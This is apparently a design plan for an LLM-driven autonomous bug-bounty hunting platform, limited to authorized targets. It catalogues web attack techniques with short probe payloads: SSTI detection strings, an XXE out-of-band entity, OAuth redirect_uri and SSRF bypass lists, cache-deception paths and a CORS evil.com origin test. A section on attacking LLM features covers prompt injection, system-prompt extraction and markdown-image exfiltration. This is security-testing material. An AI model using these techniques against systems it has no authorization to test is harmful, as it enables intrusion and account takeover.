# Plan 3 — Full-Coverage Autonomous Hunting Platform

> Base: Plan 1 (terminal draft) architecture. Additions: every bug category from the mind-hunt
> skill library is now covered by a module, plus the executor primitives and architecture fixes
> required to actually test them. Scope of the whole system: **authorized targets only** —
> bug bounty programs, owned lab environments, and contracted engagements. Scope enforcement is
> a technical requirement of the system (an out-of-control agent burns IPs, triggers lockouts,
> and produces unreproducible findings), not an afterthought.

---

# 0. What Changed From Plan 1

| Area | Plan 1 | Plan 3 |
|---|---|---|
| Bug categories | 7 modules (SQLi, XSS, RCE, SSRF, Auth, IDOR, Business Logic) | **31 modules + 8 platform packs + web3 track** — full mind-hunt coverage |

| Model output | Some paths auto-run generated PoC code | Models emit **structured action proposals only**; PoC scripts are human-run artifacts |
| WAF loop | Mutation matrix | Mutation matrix **+ payload trigger bisection** (from plan2 §9.4) |
| Validation | Classifier states | Classifier states **+ 7-Question Gate + Body-Diff Rule + marker discipline** (from mind-hunt) |

Core principle unchanged:

> **LLMs plan, hypothesize, mutate, and reason. Deterministic tools execute, observe, classify,
> and feed evidence back. The LLM proposes; the system verifies.**

# 1. Architecture

```text
Campaign State + Scope/Policy Engine
        ↓
Recon / Mapping Agent  ──→  Fingerprint Dispatcher ──→ Platform Packs
        ↓
Attack Graph  ←── Object/Role/Workflow Mapper
        ↓
Hypothesis Engine (LLM: local 30B → hosted → Claude escalation)
        ↓
Payload Lab / Mutation Engine  ←── Learning Memory (genes, WAF KB, quirks, lessons)
        ↓
Policy Gate (risk budget, autonomy level, per-connection scope check)
        ↓
Executor Pool
  ├── http_executor        (async HTTP, auth states, rate limited)
  ├── browser_executor     (Playwright: DOM, postMessage, SPA, stored XSS proof)
  ├── burst_executor       (synchronized concurrent sends — race conditions)
  ├── raw_socket_executor  (byte-exact HTTP/1.1 + H2 — smuggling)
  ├── multipart_executor   (file upload: content-type/filename/magic-byte control)
  └── graphql_client       (introspection, batching, aliases, node() queries)
        ↓
Observer (response vector: status, headers, body hash, DOM hash, latency,
          cache headers, canary reflection, OOB callback hits, console, cookies)
        ↓
Block / WAF / Vulnerability Classifier (deterministic state machine)
        ↓
Chaining / Path Planning Agent (search over attack graph)
        ↓
Triage / Validation Gate (7-Q Gate, Body-Diff Rule)
        ↓
Report Agent
        ↓
Learning Memory (payload genes + lesson cards + WAF KB + target quirks)
```

## 1.1 The Three Non-Negotiable Boundaries

1. **Per-connection scope enforcement.** Scope is validated when the task is created AND when
   each connection is opened: redirect targets re-validated before following, DNS answers
   checked against allowlists (incl. IPv6 and private ranges unless lab mode), browser
   subrequests filtered, subprocess egress restricted at the OS/container level. A hostname
   check at plan time is not a boundary.
2. **Models never emit executable code into the hot loop.** LLM output is a JSON action
   proposal validated against a schema; the executor only runs reviewed action types with
   parameter constraints. PoC scripts generated by Codex are saved as artifacts for the human
   operator to run — never auto-executed by the orchestrator.
3. **Evidence before findings.** Only the deterministic classifier, on observer data, can move
   a finding to `confirmed`. LLM confidence is prioritization input, never confirmation.

# 3. Executor Primitives (new — these unlock the missing categories)

## 3.1 burst_executor — race conditions
- Opens N concurrent connections to the same endpoint.
- Synchronizes on **final-byte send** (hold all requests at last byte, release simultaneously —
  the Turbo Intruder last-byte-sync pattern).
- Configurable N (2–50), per-connection auth state (same token unless testing token races).
- Observer computes: how many succeeded vs. the invariant (e.g., coupon redeemed once →
  2+ successes = race bug).
- Use for: coupon/promo double-spend, gift cards, limited stock, OTP verify races,
  withdraw/transfer double-spend, rate-limit counter races, email verification token races.

## 3.2 raw_socket_executor — HTTP request smuggling
- Byte-exact control of headers, body, framing: CL.TE, TE.CL, TE.TE, H2.CL, H2.TE.
- `httpx`/`requests` are forbidden here — they normalize requests and destroy the probe.
- Detection modes: **timing** (backend waits for body → ~10s stall) and **differential**
  (poisoned prefix affects the NEXT request on the same connection — test with own session
  first, never blind-poison shared infrastructure).
- High-risk class: L2+ autonomy, evidence-first (own-connection poisoning before any claim).

## 3.3 multipart_executor — file uploads
- Controls: filename (extension case, double extension, null byte), Content-Type per part,
  raw body bytes (magic-byte prefixes, polyglots), multiple parts, chunked upload.
- Post-upload verification: fetch the stored file, check execution context (SVG served as
  `image/svg+xml` vs sanitized), canary echo.

## 3.4 graphql_client
- Introspection query → parse schema → **feed types/queries/mutations directly into the attack
  graph** (better object discovery than HTTP probing).
- `node(id:)` / relay global-ID probing (base64 `User:456` style) for IDOR.
- Batching (array of queries) and aliases for rate-limit bypass testing.
- Depth/complexity probes for DoS-class info (report only, do not stress).

## 3.5 browser_executor (expanded from Plan 1 §16)
- Already covers DOM/mXSS/postMessage/SPA. Additions: CSP report capture, service worker
  inspection, clickjacking (X-Frame-Options framing test), client-side prototype pollution
  check (`Object.prototype` pollution via `?__proto__[x]=`), stored-XSS victim-view proof
  (second canary account visits the page → screenshot + console evidence).

## 3.6 http_executor (expanded)
- Multipart support (delegates to 3.3), GraphQL support (delegates to 3.4), auth-state
  pool (multiple roles' sessions), cache-header capture (`x-cache`, `age`, `Cache-Control`)
  for cache modules, per-connection scope gate.

## GROUP A — INJECTION

### A1. SQL Injection  *(plan1 §6A, unchanged + bisection)*
- Techniques: error/boolean/time/union/stacked/second-order/JSON/header/cookie/OOB.
- Canary: `canary_sqli_<rand>` markers, `SLEEP(3)`, OOB `EXTRACTVALUE/LOAD_FILE` style.
- **Addition from plan2:** when a payload is blocked, **bisect the payload** to find the exact
  triggering token before mutating (P0 = "", P1 = first fragment, ... → isolate → generate
  semantic equivalents of only the flagged fragment). Cheaper and smarter than blind mutation.
- Safety: SELECT-only confirmation, no DML/DDL, limited rows, time-delays bounded (≤10s).

### A2. XSS — reflected / stored / DOM / mXSS  *(plan1 §6B, unchanged)*
- Context detection (HTML body/attribute/JS string/JS expression/URL/JSON) before payload gen.
- CSP analysis in observer; browser executor for DOM proof (`onerror` canary, screenshot).
- Stored-XSS: two-account proof — attacker stores, victim (canary account) views, evidence =
  victim-side execution. Never test on real users.

### A3. SSTI — Server-Side Template Injection  *(upgraded from one line)*
- **Detection matrix (send all, watch for the arithmetic result):**

| Payload | If `49` → | If `7777777` → |
|---|---|---|
| `{{7*7}}` | Jinja2 / Twig | — |
| `${7*7}` | Freemarker / Velocity | — |
| `<%= 7*7 %>` | ERB (Ruby) | — |
| `#{7*7}` | Mako | — |
| `*{7*7}` | Thymeleaf | — |
| `{{7*'7'}}` | — | Jinja2 (not Twig) |

- Where to test: name/bio/description fields, email templates, invoice/PDF generators,
  URL path params, search queries, reflected headers.
- Escalation: engine-specific canary (e.g., Jinja2 config/timer readout) → RCE module
  handoff with L2+ autonomy. Never jump straight to `popen`/`os.system` payloads.

### A4. XXE
- Parse targets: file-upload XML/SVG/DOCX/XLSX parsers, SAML endpoints (see B5),
  any `Content-Type: text/xml` / `application/xml` accept.
- Techniques: in-band error-based (file existence via error text), OOB via parameter entities
  to canary DNS/HTTP, blind via timing.
- Canary: `<!ENTITY xxe SYSTEM "http://canary/<marker>">` — OOB hit = confirmed parse of
  external entities. DTD retrieval to canary = external DTD support.

### A5. RCE / Command Execution  *(plan1 §6C, unchanged in scope, execution tightened)*
- Targets: command injection, SSTI escalation, EL injection, deserialization, upload→webshell
  (lab/canary-only proof), LFI+log poison, SSRF→internal RCE, webhook/CI-CD exec.
- Confirmation: time delay, OOB callback with marker, `id`/`hostname` echo. Canaries only.
- PoC scripts: generated by Codex, saved to `reports/poc/`, **run by the operator**.

## GROUP B — AUTHENTICATION & SESSION

### B1. Auth / Access Control  *(plan1 §6E sibling-rule core)*
- **Sibling rule:** for every endpoint family, find the member missing auth middleware
  (`/admin/users` guarded, `/admin/export` not).
- Client-side-only role checks (UI hides button, backend doesn't check).
- Old API versions (`/v1/` vs `/v2/`), method swap (PUT guarded, DELETE not),
  `X-HTTP-Method-Override`.

### B2. ATO — Account Takeover  *(plan1 §6E, expanded to the 5-path taxonomy)*
1. **Password reset poisoning:** `Host:` / `X-Forwarded-Host:` manipulation → reset link to
   attacker domain → token capture.
2. **Reset token in Referer:** reset page loads third-party script → token leaks in Referer.
3. **Predictable/weak reset tokens:** entropy check (6-digit numeric = brute-forceable —
   only against canary accounts, lockout-aware).
4. **Token lifecycle:** non-expiring, non-invalidated after reuse, old token valid after new
   request, session survives password change.
5. **Email/username change without re-auth:** `PUT /api/user/email` with no password confirm.
- Proof: full ATO demonstrated **on the canary victim account**, state restored after.

### B3. MFA / 2FA Bypass  *(upgraded from checklist to module)*
- OTP entropy/length, OTP reuse, OTP brute (canary account, lockout-aware, burst executor for
  verify-race), response tampering (flip `"success": false` → server trusts client-modified
  response where applicable), null/empty/missing OTP field, 2FA fatigue (only against canary),
  "remember device" token scope, backup-code rate limits, MFA skip via parameter removal
  (`&mfa=false`, missing `totp` field), race between login and MFA enrollment.

### B4. OAuth / OIDC  *(upgraded to full module)*
- **PKCE enforcement:** authorization request without `code_challenge` → 302 (not error) = not
  enforced.
- **State parameter:** missing/weak/predictable → CSRF-on-OAuth (login CSRF → session swap).
- **redirect_uri bypass matrix (11 techniques):** `@` symbol, subdomain abuse, `javascript:`
  protocol, double encoding, backslash normalization, protocol-relative `//`, null byte,
  IDN homoglyph, `data:` URL, fragment confusion, redirect-chain via allowed redirector.
- Token handling: auth-code reuse, refresh-token scope escalation, token substitution between
  clients.
- Impact rule: redirect_uri bypass + code interception = ATO (critical).

### B5. SAML / SSO
- **XSW (XML Signature Wrapping) variants 1–8:** embed sibling/duplicate `<Assertion>`,
  move `<Signature>` element, so the verifying parser and the business-logic parser read
  different nodes.
- Signature stripping (does the SP reject unsigned?), unsigned AttributeStatement injection,
  NameID manipulation (admin victim), comment injection inside NameID
  (`admin@target.com<!--x-->@attacker.com`), replay across SPs, namespace/confusion tricks,
  `AllowCreate` / `NameIDFormat` abuse.
- Requires: XML manipulation capability in the payload lab (lxml with canonicalization
  control). Validate against canary IdP/SP pair in lab first; on real targets only replay
  captured canary-session assertions.

### B6. Credentials / Brute-force  *(plan1 §6E, canary-only rule tightened)*
- Enumeration (username/email via response differential — Body-Diff rule applies),
  lockout-threshold inference, token prediction, canary-account-only brute force,
  leaked-pattern wordlists via local 30B generation.
- Hard stops: lockout detected → pause + learn threshold; captcha → stop; never hammer.

## GROUP E — TRANSPORT, CACHES & INFRASTRUCTURE

### E1. SSRF  *(plan1 §6D + mind-hunt's 11 IP-bypass table)*
- IP bypass: decimal / octal / hex / short / IPv6 / IPv6-mapped / DNS rebinding /
  redirect-chain / URL-parser confusion / CNAME-in / mixed-hex.
- Internal probing (scope permitting): metadata endpoints, internal admin ports.
- **Impact ladder:** DNS-only = informational → internal service = medium →
  metadata/keys = high → keys+exfil proof = critical.

### E2. HTTP Request Smuggling  *(new — needs raw_socket_executor §3.2)*
- CL.TE, TE.CL, TE.TE, H2.CL, H2.TE probe sets.
- Detection: timing (stall), differential (own-session prefix poisoning), never
  blind poison shared infra. Report requires reproducible evidence pair
  (smuggled request + affected response).

### E3. Cache Poisoning & Web Cache Deception  *(new)*
- **Poisoning:** unkeyed input discovery (Param-Miner-style header/param mining),
  reflected-into-body + cacheable check (`x-cache: HIT` after second fetch),
  fat GET (body on GET), header injection into cache key.
- **Deception:** path variants (`/account/settings/nonexistent.css`,
  `%2F..%2Fstatic.css`, `;.css`, `/.css`) → private response cached →
  fetch as anonymous → victim data disclosure proof (canary victim).
- Observer requirement: cache-status header tracking (added §3.6).

### E4. Subdomain Takeover  *(new — recon stage)*
- Dangling CNAME detection (dnsx on recon output), fingerprint table:
  GitHub Pages / S3 `NoSuchBucket` / Heroku / Azure / Fastly / GitLab Pages.
- Impact escalation: bare takeover = low/med; + cookie domain (`*.target.com`) = high;
  + OAuth `redirect_uri` allowlist = critical (ATO); + CSP allowlist entry = critical.
- Verification only — claiming requires explicit authorization (registering the
  resource impacts shared infrastructure).

### E5. Cloud / Infrastructure Misconfiguration  *(new)*
- Bucket probing: S3/GCS/Azure Blob listing + write, Firebase open rules
  (`.json` read / PUT), name permutation from target name
  (`target`, `target-backup`, `target-assets`, `target-prod`, `target-staging`).
- Exposed panels & files: `/jenkins /grafana /kibana /elasticsearch
  /swagger-ui.html /phpMyAdmin /.env /config.json /api-docs /server-status`.
- Cloud IAM deep probing via platform pack (§5).

### E6. API Misconfiguration  *(expanded from plan1 fragments)*
- **CORS:** reflected origin + credentials (`Origin: https://evil.com` → ACAO reflect +
  ACAC true = critical), null origin, subdomain wildcard trust, HTTP origin trust,
  wildcard + credentials (invalid but sometimes honored).
- **JWT:** `alg=none`, RS256→HS256 confusion (sign with public key as HMAC secret),
  weak secret (canary-local crack), `kid` injection, missing expiry/audience checks.
- **Prototype pollution:** server-side Node merge gadgets
  (`{"__proto__": {...}}`, `constructor.prototype`), URL variants
  (`?__proto__[isAdmin]=true`), client-side check via browser executor,
  gadget chains to XSS/RCE.
- **Verb/method misconfig:** hidden methods (OPTIONS probing), TRACE, method override.

## GROUP G — AI / LLM FEATURES  *(new — hunt-llm-ai, ASI01–10)*

Targets: chatbots, RAG endpoints, summarizers, agentic copilots, document-AI features.
An LLM endpoint is just an endpoint — the canary architecture applies directly.

- **Prompt injection (direct):** system-prompt extraction, role override.
  Alone = informational.
- **Indirect injection:** uploaded document / fetched URL / email contains instructions
  that the target LLM obeys.
- **IDOR via chatbot (highest-value AI bug):** per-session scoping check —
  "show me user <other-id>'s data" style probes with canary accounts.
  Cross-user data return = IDOR-class finding, not "AI issue."
- **Exfiltration via markdown/image render:** `![x](https://canary/<marker>?d=<template>)`
  — rendered markdown fires a GET with inlined data.
- **Tool-use exfil / SSRF:** target LLM has fetch/URL tools → injected URL →
  canary callback; internal fetch = SSRF-class.
- **ASCII/Unicode tag smuggling:** invisible tag block (U+E0000–U+E007F) payloads.
- **ASI01–10 coverage:** goal hijack, tool misuse, privilege abuse across agents,
  supply chain (MCP/plugin output injection), code-exec sandbox escape (report, don't
  escape), memory/RAG poisoning, agent-comms IDOR, cascading failure leaks,
  trust exploitation (AI output rendered as HTML → XSS), rogue-agent controls.
- **Triage rule: ASI signals alone = informational. Must chain to IDOR / data exfil /
  SSRF / RCE / ATO for a reportable finding.**

**prompt/knowledge packs** (mind-hunt SKILL.md content) driving the standard modules —

| Fingerprint signal | Pack |
|---|---|
| `okta.com` / `auth0.com` / `pingidentity` | okta-attack |
| `login.microsoftonline.com` / outlook / STS | m365-entra-attack |
| pulse / fortinet / ivanti / citrix | enterprise-vpn-attack |
| vsphere / vcenter / `:9443` | vmware-vcenter-attack |
| amazonaws / azure / googleapis | cloud-iam-deep |
| `github.com/<org>/` | supply-chain-attack-recon |

doctrines.

# 7. Validation & Triage Gate (all findings pass through this)

From mind-hunt's `triage-validation` / validator agent:

**The 7-Question Gate** (PASS / KILL / DOWNGRADE) before any finding is recorded:
1. Is there a full request/response evidence pair (live-reproduced)?
2. Body-diff vs. baseline shown (not status-code-only)?
3. What can the attacker DO right now (concrete action)?
4. What does the victim LOSE (real asset)?
5. Reproducible in 10 minutes from scratch, stated preconditions realistic?
6. Marker unique and absent from the no-marker baseline?
7. False-oracle check: is the "signal" actually a server policy/blocklist response
   (see I3 lesson)?

**Finding lifecycle:** `hypothesis → observed → needs_review → confirmed / rejected →
